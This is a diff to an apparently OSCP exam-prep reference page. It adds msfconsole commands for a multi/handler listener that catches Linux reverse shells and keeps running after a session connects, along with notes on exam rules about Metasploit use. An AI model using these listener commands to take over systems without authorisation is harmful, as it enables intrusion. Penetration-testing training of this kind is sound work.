@@ -197,6 +197,26 @@ Allowed against all targets:
 
 Meterpreter itself remains limited to the one selected target.
 </code></pre>
+<h3>Metasploit multi/handler — keep the listener running (ExitOnSession + run -j)</h3>
+<p><strong>Use for:</strong> a reverse-shell payload that may call back more than once (for example after reconnecting), without restarting the same handler. These commands belong <strong>inside msfconsole</strong>, not the Kali Bash prompt. <code>run -j</code> runs the handler as a background job; <code>set ExitOnSession false</code> keeps it listening after a session connects. Neither option changes the OSCP restrictions above.</p>
+<pre class="ref-code"><code class="language-text"># Start msfconsole -q in a separate Kali terminal, then:
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST 10.10.14.2
+set LPORT 4444
+set ExitOnSession false
+run -j
+jobs -v
+sessions -l
+
+# When a session arrives, interact with its listed numeric ID:
+sessions -i 1
+
+# Return to msfconsole with the session's background command,
+# then use jobs -k with the handler's numeric job ID when finished.
+</code></pre>
+<p><strong>Check before running:</strong> replace <code>10.10.14.2</code> with your actual Kali callback IP, and match <code>PAYLOAD</code>, <code>LHOST</code>, and <code>LPORT</code> to the single payload you generated. The Linux shell example is <em>not</em> a Meterpreter payload. For a Windows or staged payload, select the actual matching handler payload instead of blindly copying the Linux one. <code>jobs</code> lists listeners; <code>sessions</code> lists established sessions.</p>
+<p><strong>OSCP restriction:</strong> the official exam guide explicitly permits <code>exploit/multi/handler</code> and <code>msfvenom</code> across targets, <em>but Meterpreter and Auxiliary/Exploit/Post modules are restricted to one selected target</em>; no Metasploit pivoting. <code>ExitOnSession false</code> is for retaining a listener, <strong>not</strong> permission to reuse restricted payloads across machines. See <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank" rel="noopener noreferrer">OffSec exam guide</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/cli/msfconsole/jobs.md" target="_blank" rel="noopener noreferrer">Rapid7 background jobs documentation</a>.</p>
 <h3>Responder</h3>
 <p>The <strong>Responder tool itself is listed as allowed</strong>, but <strong>poisoning and spoofing are not allowed</strong>. Therefore, use <strong>analyze mode only</strong> and do not perform LLMNR/NBT-NS poisoning or spoofing.</p>
 <h3>Allowed/open-book behavior</h3>
